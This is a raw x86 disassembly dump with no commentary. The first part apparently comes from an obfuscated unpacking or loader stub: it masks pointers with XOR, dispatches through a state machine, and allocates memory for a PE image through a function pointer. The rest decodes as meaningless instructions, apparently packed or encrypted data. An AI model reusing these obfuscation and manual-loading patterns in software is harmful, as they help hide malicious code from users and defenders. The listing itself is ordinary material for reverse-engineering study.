  41e0d2:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0d5:	mov    ecx,DWORD PTR [ecx]
  41e0d7:	xor    ecx,edi
  41e0d9:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e0e0:	cmp    cl,al
  41e0e2:	jne    0x41e178
  41e0e8:	mov    eax,DWORD PTR [ebp-0x14]
  41e0eb:	mov    eax,DWORD PTR [eax]
  41e0ed:	xor    eax,edi
  41e0ef:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e0f6:	mov    ecx,DWORD PTR [ebp+0xc]
  41e0f9:	mov    ecx,DWORD PTR [ecx]
  41e0fb:	xor    ecx,edi
  41e0fd:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e104:	xor    al,cl
  41e106:	mov    ecx,DWORD PTR [ebp-0xc]
  41e109:	mov    ecx,DWORD PTR [ecx]
  41e10b:	xor    ecx,edi
  41e10d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e114:	or     al,cl
  41e116:	mov    ecx,DWORD PTR [ebp+0xc]
  41e119:	mov    ecx,DWORD PTR [ecx]
  41e11b:	xor    ecx,edi
  41e11d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e124:	cmp    cl,al
  41e126:	jne    0x41e178
  41e128:	mov    eax,DWORD PTR [ebp-0x14]
  41e12b:	mov    eax,DWORD PTR [eax]
  41e12d:	xor    eax,edi
  41e12f:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e136:	mov    ecx,DWORD PTR [ebp-0xc]
  41e139:	mov    ecx,DWORD PTR [ecx]
  41e13b:	xor    ecx,edi
  41e13d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e144:	xor    al,cl
  41e146:	mov    ecx,DWORD PTR [ebp-0x10]
  41e149:	mov    ecx,DWORD PTR [ecx]
  41e14b:	xor    ecx,edi
  41e14d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e154:	or     al,cl
  41e156:	mov    ecx,DWORD PTR [ebp-0x14]
  41e159:	mov    ecx,DWORD PTR [ecx]
  41e15b:	xor    ecx,edi
  41e15d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e164:	cmp    cl,al
  41e166:	jne    0x41e178
  41e168:	lea    eax,[ebp-0x4c]
  41e16b:	push   eax
  41e16c:	call   0x41dc33
  41e171:	mov    ecx,DWORD PTR [ebp-0x44]
  41e174:	cmp    eax,ecx
  41e176:	je     0x41e182
  41e178:	mov    eax,DWORD PTR [ebp+0x8]
  41e17b:	xor    eax,edi
  41e17d:	add    eax,ebx
  41e17f:	mov    DWORD PTR [ebp+0x18],eax
  41e182:	mov    eax,DWORD PTR [ebp-0x8]
  41e185:	xor    eax,edi
  41e187:	lea    eax,[eax+esi*1+0x3272e0]
  41e18e:	xor    eax,edi
  41e190:	mov    ecx,DWORD PTR [ebp+0x8]
  41e193:	mov    edx,DWORD PTR [ebp+0x18]
  41e196:	xor    ecx,edi
  41e198:	add    ecx,ebx
  41e19a:	cmp    edx,ecx
  41e19c:	je     0x41df99
  41e1a2:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a5:	mov    ecx,DWORD PTR [ebp+0x18]
  41e1a8:	xor    eax,edi
  41e1aa:	add    eax,ebx
  41e1ac:	cmp    ecx,eax
  41e1ae:	jne    0x41e1c1
  41e1b0:	mov    eax,DWORD PTR [ebp-0x8]
  41e1b3:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e1b6:	xor    eax,edi
  41e1b8:	lea    eax,[eax+ecx*1+0x3272e0]
  41e1bf:	jmp    0x41e238
  41e1c1:	push   0x18
  41e1c3:	push   DWORD PTR [ebp-0x4]
  41e1c6:	lea    eax,[ebp-0x64]
  41e1c9:	push   eax
  41e1ca:	call   0x41d455
  41e1cf:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d2:	mov    ecx,DWORD PTR [ebp-0x18]
  41e1d5:	xor    eax,edi
  41e1d7:	add    eax,ebx
  41e1d9:	cmp    eax,ecx
  41e1db:	je     0x41e1f0
  41e1dd:	mov    eax,DWORD PTR [ebp+0x8]
  41e1e0:	xor    eax,edi
  41e1e2:	add    eax,ebx
  41e1e4:	push   eax
  41e1e5:	push   0x18
  41e1e7:	lea    eax,[ebp-0x64]
  41e1ea:	push   eax
  41e1eb:	call   0x41d9e2
  41e1f0:	mov    eax,DWORD PTR [ebp-0x4]
  41e1f3:	add    eax,0x18
  41e1f6:	mov    DWORD PTR [ebp+0x18],eax
  41e1f9:	push   DWORD PTR [ebp-0x50]
  41e1fc:	push   DWORD PTR [ebp+0x18]
  41e1ff:	mov    eax,DWORD PTR [ebp-0x54]
  41e202:	add    eax,DWORD PTR [ebp-0x20]
  41e205:	push   eax
  41e206:	call   0x41d455
  41e20b:	mov    eax,DWORD PTR [ebp+0x8]
  41e20e:	mov    ecx,DWORD PTR [ebp-0x18]
  41e211:	xor    eax,edi
  41e213:	add    eax,ebx
  41e215:	cmp    eax,ecx
  41e217:	je     0x41e22a
  41e219:	push   0x0
  41e21b:	push   DWORD PTR [ebp-0x50]
  41e21e:	mov    eax,DWORD PTR [ebp-0x54]
  41e221:	add    eax,DWORD PTR [ebp-0x20]
  41e224:	push   eax
  41e225:	call   0x41d9e2
  41e22a:	mov    eax,DWORD PTR [ebp-0x24]
  41e22d:	mov    ecx,DWORD PTR [ebp-0x50]
  41e230:	add    DWORD PTR [eax],ecx
  41e232:	mov    eax,DWORD PTR [ebp-0x50]
  41e235:	add    eax,DWORD PTR [ebp+0x1c]
  41e238:	mov    DWORD PTR [ebp+0x1c],eax
  41e23b:	mov    eax,DWORD PTR [ebp-0x8]
  41e23e:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e241:	xor    eax,edi
  41e243:	add    eax,ebx
  41e245:	imul   eax,ecx
  41e248:	mov    ecx,DWORD PTR [ebp+0x8]
  41e24b:	mov    edx,DWORD PTR [ebp-0x28]
  41e24e:	xor    ecx,edi
  41e250:	lea    ecx,[ecx+edx*1+0x3272e0]
  41e257:	cmp    eax,ecx
  41e259:	jb     0x41deb7
  41e25f:	mov    esi,DWORD PTR [ebp+0x14]
  41e262:	mov    eax,DWORD PTR [ebp-0x20]
  41e265:	mov    DWORD PTR [esi],eax
  41e267:	jmp    0x41e2ae
  41e269:	mov    ecx,DWORD PTR [ebp+0x8]
  41e26c:	mov    edx,DWORD PTR [ebp+0xc]
  41e26f:	xor    ecx,edi
  41e271:	xor    edx,edi
  41e273:	add    ecx,ebx
  41e275:	add    edx,ebx
  41e277:	cmp    ecx,edx
  41e279:	jne    0x41e28d
  41e27b:	mov    eax,ds:0x7f642d1e
  41e280:	imul   eax,eax,0x9f15fcef
  41e286:	mov    ds:0x7f642d1e,eax
  41e28b:	jmp    0x41e2ae
  41e28d:	mov    ecx,DWORD PTR [ebp+0x8]
  41e290:	xor    ecx,edi
  41e292:	add    ecx,ebx
  41e294:	cmp    eax,ecx
  41e296:	je     0x41e2a4
  41e298:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  41e2a2:	jmp    0x41e2ae
  41e2a4:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  41e2ae:	pop    edi
  41e2af:	pop    esi
  41e2b0:	pop    ebx
  41e2b1:	leave  
  41e2b2:	ret    0x18
  41e2b5:	push   ebp
  41e2b6:	mov    ebp,esp
  41e2b8:	and    esp,0xfffffff8
  41e2bb:	mov    eax,DWORD PTR [ebp+0x20]
  41e2be:	sub    esp,0x14
  41e2c1:	push   ebx
  41e2c2:	mov    ebx,DWORD PTR [ebp+0x14]
  41e2c5:	push   esi
  41e2c6:	push   edi
  41e2c7:	cmp    eax,0xf89c85b9
  41e2cc:	jne    0x41e2d8
  41e2ce:	push   0xf89c85b8
  41e2d3:	jmp    0x41e40a
  41e2d8:	mov    eax,DWORD PTR [ebp+0x20]
  41e2db:	cmp    eax,0xf89c85b8
  41e2e0:	jne    0x41e2ec
  41e2e2:	push   0xf89c85bb
  41e2e7:	jmp    0x41e40a
  41e2ec:	mov    eax,DWORD PTR [ebp+0x20]
  41e2ef:	cmp    eax,0xf89c85bb
  41e2f4:	jne    0x41e300
  41e2f6:	push   0xf89c85ba
  41e2fb:	jmp    0x41e40a
  41e300:	mov    eax,DWORD PTR [ebp+0x20]
  41e303:	cmp    eax,0xf89c85ba
  41e308:	jne    0x41e314
  41e30a:	push   0xf89c85bd
  41e30f:	jmp    0x41e40a
  41e314:	mov    ecx,DWORD PTR [ebp+0x20]
  41e317:	mov    eax,0xf89c85be
  41e31c:	cmp    ecx,eax
  41e31e:	jne    0x41e3da
  41e324:	mov    eax,DWORD PTR [ebp+0x10]
  41e327:	mov    DWORD PTR [esp+0xc],eax
  41e32b:	mov    eax,DWORD PTR [ebp+0x18]
  41e32e:	mov    DWORD PTR [esp+0x14],eax
  41e332:	mov    eax,DWORD PTR [ebp+0xc]
  41e335:	mov    DWORD PTR [esp+0x18],eax
  41e339:	mov    eax,DWORD PTR [ebp+0x8]
  41e33c:	mov    DWORD PTR [esp+0x10],eax
  41e340:	mov    eax,DWORD PTR [esp+0x10]
  41e344:	mov    ecx,DWORD PTR [esp+0x14]
  41e348:	mov    edi,0x7510899
  41e34d:	xor    eax,edi
  41e34f:	mov    esi,0x3272e0
  41e354:	add    eax,esi
  41e356:	mov    DWORD PTR [ecx],eax
  41e358:	mov    eax,DWORD PTR [esp+0xc]
  41e35c:	mov    eax,DWORD PTR [eax+0x194]
  41e362:	mov    ecx,DWORD PTR [eax]
  41e364:	mov    eax,DWORD PTR [esp+0xc]
  41e368:	mov    eax,DWORD PTR [eax+0x194]
  41e36e:	mov    eax,DWORD PTR [eax]
  41e370:	add    eax,DWORD PTR [ecx+0x3c]
  41e373:	mov    ecx,DWORD PTR [esp+0xc]
  41e377:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41e37d:	mov    ecx,DWORD PTR [ecx+0x14]
  41e380:	push   0x4
  41e382:	push   0x3000
  41e387:	push   DWORD PTR [eax+0x50]
  41e38a:	push   0x0
  41e38c:	call   ecx
  41e38e:	mov    DWORD PTR [ebx],eax
  41e390:	mov    eax,DWORD PTR [esp+0x10]
  41e394:	push   DWORD PTR [esp+0xc]
  41e398:	xor    eax,edi
  41e39a:	add    eax,esi
  41e39c:	mov    DWORD PTR [esp+0x20],eax
  41e3a0:	lea    eax,[esp+0x20]
  41e3a4:	push   eax
  41e3a5:	push   ebx
  41e3a6:	push   DWORD PTR [esp+0x20]
  41e3aa:	push   DWORD PTR [esp+0x28]
  41e3ae:	push   DWORD PTR [esp+0x24]
  41e3b2:	call   0x41dd77
  41e3b7:	mov    eax,DWORD PTR [esp+0x10]
  41e3bb:	mov    ecx,DWORD PTR [ebx]
  41e3bd:	xor    eax,edi
  41e3bf:	add    eax,esi
  41e3c1:	cmp    ecx,eax
  41e3c3:	je     0x41e421
  41e3c5:	mov    eax,DWORD PTR [esp+0x18]
  41e3c9:	mov    ecx,DWORD PTR [esp+0x14]
  41e3cd:	xor    eax,edi
  41e3cf:	add    eax,esi
  41e3d1:	imul   eax,DWORD PTR [esp+0x1c]
  41e3d6:	mov    DWORD PTR [ecx],eax
  41e3d8:	jmp    0x41e421
  41e3da:	mov    ecx,DWORD PTR [ebp+0x20]
  41e3dd:	cmp    ecx,0xf89c85bd
  41e3e3:	jne    0x41e3ec
  41e3e5:	push   0xf89c85bc
  41e3ea:	jmp    0x41e40a
  41e3ec:	mov    ecx,DWORD PTR [ebp+0x20]
  41e3ef:	cmp    ecx,0xf89c85bc
  41e3f5:	jne    0x41e3fe
  41e3f7:	push   0xf89c85bf
  41e3fc:	jmp    0x41e40a
  41e3fe:	mov    ecx,DWORD PTR [ebp+0x20]
  41e401:	cmp    ecx,0xf89c85bf
  41e407:	jne    0x41e421
  41e409:	push   eax
  41e40a:	push   DWORD PTR [ebp+0x1c]
  41e40d:	push   DWORD PTR [ebp+0x18]
  41e410:	push   ebx
  41e411:	push   DWORD PTR [ebp+0x10]
  41e414:	push   DWORD PTR [ebp+0xc]
  41e417:	push   DWORD PTR [ebp+0x8]
  41e41a:	call   0x41e2b5
  41e41f:	mov    DWORD PTR [ebx],eax
  41e421:	mov    eax,DWORD PTR [ebx]
  41e423:	pop    edi
  41e424:	pop    esi
  41e425:	pop    ebx
  41e426:	mov    esp,ebp
  41e428:	pop    ebp
  41e429:	ret    0x1c
  41e42c:	push   ebp
  41e42d:	mov    ebp,esp
  41e42f:	sub    esp,0xc
  41e432:	mov    eax,0xf89c85b9
  41e437:	mov    DWORD PTR [ebp-0x8],eax
  41e43a:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  41e441:	mov    ecx,DWORD PTR [ebp-0x8]
  41e444:	xor    ecx,0x7510899
  41e44a:	add    ecx,0x3272e0
  41e450:	mov    DWORD PTR [ebp-0x4],ecx
  41e453:	mov    ecx,DWORD PTR [ebp+0xc]
  41e456:	push   eax
  41e457:	mov    DWORD PTR [ebp+0xc],ecx
  41e45a:	push   DWORD PTR [ebp+0xc]
  41e45d:	lea    eax,[ebp-0x4]
  41e460:	push   DWORD PTR [ebp+0x8]
  41e463:	push   eax
  41e464:	push   DWORD PTR [ebp+0xc]
  41e467:	push   DWORD PTR [ebp-0xc]
  41e46a:	push   DWORD PTR [ebp-0x8]
  41e46d:	call   0x41e2b5
  41e472:	mov    DWORD PTR [ebp-0x4],eax
  41e475:	mov    eax,DWORD PTR [ebp-0x4]
  41e478:	leave  
  41e479:	ret    0x8
  41e47c:	jg     0x41e432
  41e47e:	jge    0xf741a453
  41e484:	xor    BYTE PTR [ebp+0x5939916e],0xc7
  41e48b:	sar    eax,0x61
  41e48e:	add    DWORD PTR [eax],eax
  41e490:	xchg   BYTE PTR [edx],al
  41e492:	add    BYTE PTR [eax],al
  41e494:	imul   ebx,DWORD PTR [edx],0x3505828c
  41e49a:	std    
  41e49b:	loopne 0x41e45e
  41e49d:	imul   ecx,DWORD PTR [edx+eiz*4-0x69cf50de],0xa63ef200
  41e4a8:	jp     0x41e4db
  41e4aa:	xchg   ebx,eax
  41e4ab:	xchg   esi,eax
  41e4ac:	push   edx
  41e4ad:	stos   BYTE PTR es:[edi],al
  41e4ae:	scas   eax,DWORD PTR es:[edi]
  41e4af:	jbe    0x41e49c
  41e4b1:	mov    BYTE PTR [eax+0x7d1dd0e9],0x4e
  41e4b8:	jbe    0x41e48b
  41e4ba:	in     eax,0x18
  41e4bc:	mov    bl,BYTE PTR fs:[eax]
  41e4bf:	sub    al,0xce
  41e4c1:	xor    al,0xaf
  41e4c3:	in     eax,0xa
  41e4c5:	mov    edx,0x2aba344f
  41e4ca:	sub    BYTE PTR ds:0xd9cca6f7,0x96
  41e4d1:	mov    ebp,0xb175c8f5
  41e4d6:	test   DWORD PTR [eax],ecx
  41e4d8:	inc    esi
  41e4d9:	mov    WORD PTR [esi],?
  41e4db:	enter  0x9727,0x9c
  41e4df:	shl    bl,0x33
  41e4e2:	in     eax,0x7e
  41e4e4:	inc    esi
  41e4e5:	jno    0x41e54a
  41e4e7:	sahf   
  41e4e8:	mov    esi,0xd949603c
  41e4ed:	adc    ah,dh
  41e4ef:	mov    eax,0x4ccefe97
  41e4f4:	mov    cl,BYTE PTR [edx-0x44c49c9b]
  41e4fa:	retf   0xed31
  41e4fd:	and    dl,ah
  41e4ff:	push   0xbdc11b3c
  41e504:	jnp    0x41e55c
  41e506:	aad    0xcf
  41e508:	sbb    al,BYTE PTR [esi-0x41]
  41e50b:	jne    0x41e566
  41e50d:	(bad)  
  41e50e:	cld    
  41e50f:	mov    dl,0x9f
  41e511:	sub    eax,0xae49946
  41e516:	std    
  41e517:	or     BYTE PTR [esi-0x16],ah
  41e51a:	sbb    ebp,DWORD PTR [ecx+eax*2+0x5b]
  41e51e:	jbe    0x41e4eb
  41e520:	mov    bh,0xaa
  41e522:	mov    ebx,0x3bac8950
  41e527:	xor    eax,0xa94665d2
  41e52c:	mov    edi,0x86b024d8
  41e531:	rcl    dl,cl
  41e533:	pop    esi
  41e534:	fisubr WORD PTR [ecx]
  41e536:	fld    QWORD PTR [edi-0x28]
  41e539:	mov    esi,0xcba59737
  41e53e:	sbb    al,0x1c
  41e540:	pop    eax
  41e541:	xor    eax,0xae704cb1
  41e546:	cmp    ecx,edx
  41e548:	sar    DWORD PTR [ecx+0x5ad0abe1],1
  41e54e:	icebp  
  41e54f:	xchg   ebx,eax
  41e550:	in     eax,dx
  41e551:	lods   al,BYTE PTR ds:[esi]
  41e552:	fcom   st(1)
  41e554:	mov    eax,DWORD PTR [edi-0x7627a5df]
  41e55a:	mov    esp,DWORD PTR [ebp-0x23]
  41e55d:	jae    0x41e572
  41e55f:	cmp    DWORD PTR [esi+ebx*2-0x60],esi
  41e563:	das    
  41e564:	std    
  41e565:	dec    ebp
  41e566:	dec    esi
  41e567:	inc    DWORD PTR [ecx-0x6787eabf]
  41e56d:	test   bl,al
  41e56f:	adc    DWORD PTR [esi-0x5804c769],eax
  41e575:	cmp    eax,DWORD PTR [ebx]
  41e577:	mov    ecx,0xb4ce1c02
  41e57c:	loop   0x41e528
  41e57e:	outs   dx,DWORD PTR ds:[esi]
  41e57f:	add    eax,0x41eb1fc7
  41e584:	add    edi,edi
  41e586:	or     BYTE PTR [edx+0x4a],dh
  41e589:	push   cs
  41e58a:	xor    bh,cl
  41e58c:	scas   eax,DWORD PTR es:[edi]
  41e58d:	int3   
  41e58e:	mov    esi,0xcf097161
  41e593:	ror    DWORD PTR [ebp-0x28],0xa5
  41e597:	repz mov edx,DWORD PTR [edx+0xd]
  41e59b:	jg     0x41e57b
  41e59d:	inc    edi
  41e59e:	fst    DWORD PTR [edi+0x42]
  41e5a1:	sub    eax,0xdcbea7f2
  41e5a6:	cwde   
  41e5a7:	outs   dx,DWORD PTR ds:[esi]
  41e5a8:	cmp    ch,BYTE PTR [edi]
  41e5aa:	mov    eax,0xfcdad210
  41e5af:	cwde   
  41e5b0:	pop    ecx
  41e5b1:	rcl    ecx,cl
  41e5b3:	sub    DWORD PTR [ebx],0x3e2e1a38
  41e5b9:	pop    edx
  41e5ba:	xlat   BYTE PTR ds:[ebx]
  41e5bb:	dec    eax
  41e5bc:	add    BYTE PTR [esp+edi*2-0x25],ah
  41e5c0:	xor    al,0xe7
  41e5c2:	push   cs
  41e5c3:	pop    esi
  41e5c4:	repz sti 
  41e5c6:	mov    eax,0xf659e728
  41e5cb:	hlt    
  41e5cc:	out    0x56,eax
  41e5ce:	cmp    eax,0x56b738ca
  41e5d3:	mov    ch,0x20
  41e5d5:	cmp    BYTE PTR [ebx+eax*1-0x3adde198],al
  41e5dc:	es mov edx,0xf0ccd99f
  41e5e2:	and    al,cl
  41e5e4:	ja     0x41e60a
  41e5e6:	mov    ds:0x64ca3554,al
  41e5eb:	push   esp
  41e5ec:	xor    al,0xd3
  41e5ee:	daa    
  41e5ef:	sub    al,0x20
  41e5f1:	scas   eax,DWORD PTR es:[edi]
  41e5f2:	xchg   ebp,eax
  41e5f3:	dec    edi
  41e5f4:	imul   ebp,DWORD PTR [ebp-0x6c],0x67d3edb2
  41e5fb:	fidiv  DWORD PTR [edx-0x7a8ee1ea]
  41e601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e602:	adc    eax,0x76338f7
  41e607:	mov    edx,0xfedf4a63
  41e60c:	cmp    eax,0xcb38f309
  41e611:	jne    0x41e5c8
  41e613:	add    eax,ebp
  41e615:	sub    BYTE PTR [edx+0x24],ah
  41e618:	lods   eax,DWORD PTR ds:[esi]
  41e619:	pop    edi
  41e61a:	(bad)  
  41e61b:	imul   ebx,DWORD PTR [ebx+0x2d],0x6d374f8
  41e622:	add    BYTE PTR [edi+edx*4],cl
  41e625:	or     esp,esi
  41e627:	mov    ah,0x8c
  41e629:	mov    dh,0x58
  41e62b:	pop    esp
  41e62c:	mov    WORD PTR [ecx],ds
  41e62e:	rcl    BYTE PTR [eax],0x66
  41e631:	cmp    DWORD PTR [edx+0x1dfc0d6f],edx
  41e637:	mov    edx,0xe3a3d55e
  41e63c:	jmp    0xdfe1:0xf847ed1c
  41e643:	pop    es
  41e644:	mov    ebp,0x61c22b89
  41e649:	aam    0xf0
  41e64b:	xor    ebx,DWORD PTR [edi+0x4d]
  41e64e:	lea    esi,[edx]
  41e650:	cli    
  41e651:	jl     0x41e5df
  41e653:	stos   BYTE PTR es:[edi],al
  41e654:	and    al,0xa0
  41e656:	and    DWORD PTR [ebx],0xffffffdc
  41e659:	xor    BYTE PTR [edi+0x7ff4583],0x5a
  41e660:	sub    al,0x23
  41e662:	dec    edi
  41e663:	stos   DWORD PTR es:[edi],eax
  41e664:	push   ebx
  41e665:	sub    edx,DWORD PTR [ebx]
  41e667:	retf   0x3ec1
  41e66a:	xchg   esp,eax
  41e66b:	rcl    bl,cl
  41e66d:	push   ds
  41e66e:	(bad)  
  41e66f:	pop    ebx
  41e670:	in     eax,0xf
  41e672:	shl    BYTE PTR [ebx+eiz*1-0x2ad3f2fa],0x7d
  41e67a:	add    edx,DWORD PTR [edi]
  41e67c:	mov    ds:0xe4fd5879,eax
  41e681:	shr    DWORD PTR [edx-0x23],1
  41e684:	loop   0x41e615
  41e686:	dec    edx
  41e687:	sbb    dl,al
  41e689:	fld    DWORD PTR [eax-0x6c]
  41e68c:	jmp    0x33cfa703
  41e691:	xchg   edx,eax
  41e692:	mov    ch,0x85
  41e694:	ror    bh,1
  41e696:	rcl    DWORD PTR [eax+0x57],cl
  41e699:	sbb    eax,0x4718d5cb
  41e69e:	jbe    0x41e62e
  41e6a0:	clc    
  41e6a1:	imul   ecx,DWORD PTR ds:0x75ee9b1e,0xbe4cb93b
  41e6ab:	push   ss
  41e6ac:	or     al,0x1c
  41e6ae:	call   0x36e36cd6
  41e6b3:	ret    
  41e6b4:	xchg   ebx,eax
  41e6b5:	ficomp DWORD PTR [eax-0x5ddd1253]
  41e6bb:	push   0xe1029987
  41e6c0:	aam    0x2d
  41e6c2:	sbb    eax,0xa8816227
  41e6c7:	mov    BYTE PTR [eax+0x107e4139],cl
  41e6cd:	test   eax,0x46a99e2a
  41e6d2:	sbb    BYTE PTR [esi],cl
  41e6d4:	lea    edx,[ebx-0x76]
  41e6d7:	pause  
  41e6d9:	xchg   edx,eax
  41e6da:	sar    bl,cl
  41e6dc:	xchg   ecx,eax
  41e6dd:	dec    esi
  41e6de:	outs   dx,DWORD PTR ds:[esi]
  41e6df:	addr16 dec edi
  41e6e1:	jnp    0x41e73a
  41e6e3:	dec    eax
  41e6e4:	push   ds
  41e6e5:	test   dl,ah
  41e6e7:	dec    esp
  41e6e8:	jno    0x41e744
  41e6ea:	dec    ebp
  41e6eb:	test   DWORD PTR [eax],ebp
  41e6ed:	mov    ah,0xda
  41e6ef:	lods   al,BYTE PTR ds:[esi]
  41e6f0:	or     BYTE PTR [edi+eax*2],0x9f
  41e6f4:	cmp    DWORD PTR [edi+ebx*1-0x80],edi
  41e6f8:	and    eax,0xb334500b
  41e6fd:	addr16 loopne 0x41e73e
  41e700:	mov    ebx,0x4078f97c
  41e705:	jne    0x41e707
  41e707:	ret    0xec37
  41e70a:	push   ds
  41e70b:	(bad)  
  41e70c:	and    DWORD PTR ds:0x8c0cab94,ecx
  41e712:	ins    BYTE PTR es:[edi],dx
  41e713:	sub    ah,BYTE PTR ds:0xde5c39c5
  41e719:	add    DWORD PTR [eax],0x0
  41e71c:	ja     0x41e76a
  41e71e:	idiv   dh
  41e720:	(bad)  
  41e721:	(bad)  
  41e722:	jg     0x41e6f1
  41e724:	mov    ah,0x6b
  41e726:	mov    dh,0x14
  41e728:	xchg   BYTE PTR [edx+0x647e1564],cl
  41e72e:	add    DWORD PTR [eax],eax
  41e730:	xchg   BYTE PTR [edx],al
  41e732:	add    BYTE PTR [eax],al
  41e734:	and    ch,BYTE PTR [esi+ebp*8-0x47]
  41e738:	fcom   QWORD PTR [edi]
  41e73a:	add    ebx,DWORD PTR [ebp+0x7a9b3f1b]
  41e740:	(bad)  
  41e741:	adc    edi,ebx
  41e743:	cmp    al,0xd1
  41e745:	xchg   ecx,eax
  41e746:	fscale 
  41e748:	inc    eax
  41e749:	pop    es
  41e74a:	sbb    ah,BYTE PTR [edi]
  41e74c:	fidivr DWORD PTR [ecx]
  41e74e:	and    eax,0x6311f0b8
  41e753:	lahf   
  41e754:	adc    bl,dl
  41e756:	jmp    0x4207:0xd3e8487
  41e75d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e75e:	cmp    ebp,DWORD PTR [esi+0x595458ca]
  41e764:	adc    al,0xf2
  41e766:	mov    ch,0x11
  41e768:	sbb    BYTE PTR [ebx+eiz*1+0x327a7e44],bh
  41e76f:	retf   0x6a76
  41e772:	sub    eax,0x74324892
  41e777:	stos   DWORD PTR es:[edi],eax
  41e778:	mov    cl,0x6c
  41e77a:	mov    bh,0x46
  41e77c:	pop    edi
  41e77d:	add    eax,0x58919802
  41e782:	push   cs
  41e783:	xor    al,0x41
  41e785:	shl    DWORD PTR [ebx+0x4c747b1c],1
  41e78b:	mov    ds:0x86a98585,al
  41e790:	nop
  41e791:	pop    eax
  41e792:	retf   0x9e51
  41e795:	cdq    
  41e796:	mov    esp,0x6735c304
  41e79b:	or     eax,0xf8989c87
  41e7a0:	(bad)  
  41e7a1:	jae    0x41e7f0
  41e7a3:	pop    esi
  41e7a4:	push   edx
  41e7a5:	(bad)  
  41e7a6:	fild   DWORD PTR [ecx+0x58]
  41e7a9:	nop
  41e7aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7ab:	out    0xa,eax
  41e7ad:	daa    
  41e7ae:	je     0x41e75b
  41e7b0:	pop    edx
  41e7b1:	shl    bl,0x72
  41e7b4:	(bad)  
  41e7b5:	push   0x25
  41e7b7:	ror    BYTE PTR [ebx-0x159733c0],cl
  41e7bd:	shl    ah,cl
  41e7bf:	fs int3 
  41e7c1:	mov    edi,esp
  41e7c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7c4:	pop    ebp
  41e7c5:	test   DWORD PTR [ebx+0x45],ecx
  41e7c8:	adc    esp,DWORD PTR [esi-0x12c08c23]
  41e7ce:	push   esi
  41e7cf:	mov    cl,0xea
  41e7d1:	or     edi,0xf5065255
  41e7d7:	jae    0x41e844
  41e7d9:	mov    ds:0xe009d8ab,eax
  41e7de:	jns    0x41e7f9
  41e7e0:	sbb    bl,BYTE PTR [eax+0x5e1c04f1]
  41e7e6:	cmp    eax,0xd5afc5bc
  41e7eb:	sahf   
  41e7ec:	mov    edi,0x6139d67c
  41e7f1:	fs mov eax,0xa25aeab7
  41e7f7:	or     DWORD PTR [edx-0x6d],edx
  41e7fa:	xor    al,0x61
  41e7fc:	xchg   esp,eax
  41e7fd:	dec    eax
  41e7fe:	sub    eax,0x9cebcd58
  41e803:	adc    eax,0x8b633a0
  41e808:	cmp    ebp,DWORD PTR [edx]
  41e80a:	je     0x41e7f2
  41e80c:	xor    eax,0xfb85ead0
  41e811:	mov    dh,0x20
  41e813:	add    BYTE PTR [edi],dh
  41e815:	mov    BYTE PTR [edx],bl
  41e817:	leave  
  41e818:	or     DWORD PTR [edx+0x17],ecx
  41e81b:	jo     0x41e85b
  41e81d:	and    ch,BYTE PTR [ebx+0x627496f7]
  41e823:	(bad)  
  41e825:	data16 (bad) 
  41e827:	sub    ebx,DWORD PTR ds:0x3b6ac03f
  41e82d:	push   0xcbd2ea98
  41e832:	push   ds
  41e833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e834:	or     bh,BYTE PTR [edi]
  41e836:	pop    edi
  41e837:	aas    
  41e838:	xchg   esp,edi
  41e83a:	xchg   esp,eax
  41e83b:	or     BYTE PTR [eax-0x5212f7f1],ah
  41e841:	aas    
  41e842:	sub    ch,BYTE PTR [edi]
  41e844:	mov    cl,0x80
  41e846:	mov    cl,BYTE PTR [edi]
  41e848:	inc    edi
  41e849:	ror    BYTE PTR [esi+edx*8-0x2607d4a4],0xa2
  41e851:	xlat   BYTE PTR ds:[ebx]
  41e852:	lods   eax,DWORD PTR ds:[esi]
  41e853:	enter  0xb08d,0xde
  41e857:	mov    ds:0xfb9f930f,eax
  41e85c:	mov    esi,0xe8db26a1
  41e861:	pop    edi
  41e862:	sar    cl,cl
  41e864:	loop   0x41e8c1
  41e866:	in     eax,0x70
  41e868:	sbb    ebx,edx
  41e86a:	retf   
  41e86b:	push   0xffffffa9
  41e86d:	adc    DWORD PTR [ebx+0x7b963850],ebx
  41e873:	jbe    0x41e87a
  41e875:	push   edi
  41e876:	arpl   WORD PTR [ebx],bx
  41e878:	pusha  
  41e879:	cmp    eax,DWORD PTR [ebp-0x30e4af2a]
  41e87f:	(bad)  
  41e880:	mov    dh,0x10
  41e882:	jo     0x41e85e
  41e884:	enter  0x32f,0x0
  41e888:	js     0x41e8e4
  41e88a:	and    BYTE PTR [edx-0x78],bl
  41e88d:	cwde   
  41e88e:	jae    0x41e879
  41e890:	xchg   cl,dl
  41e892:	clc    
  41e893:	das    
  41e894:	push   ss
  41e895:	cwde   
  41e896:	popa   
  41e897:	mov    esp,0xa44e55b5
  41e89c:	std    
  41e89d:	adc    ecx,DWORD PTR [edx]
  41e89f:	adc    dh,bh
  41e8a1:	cmp    BYTE PTR [edx-0x61586477],dh
  41e8a7:	cmp    eax,0x3533b5c0
  41e8ac:	fnstenv [eax]
  41e8ae:	stc    
  41e8af:	dec    edx
  41e8b0:	aaa    
  41e8b1:	popf   
  41e8b2:	repnz rol DWORD PTR [ebx-0x733f9b80],cl
  41e8b9:	test   BYTE PTR [ecx-0x8],0x4a
  41e8bd:	and    edi,ebx
  41e8bf:	leave  
  41e8c0:	es fwait
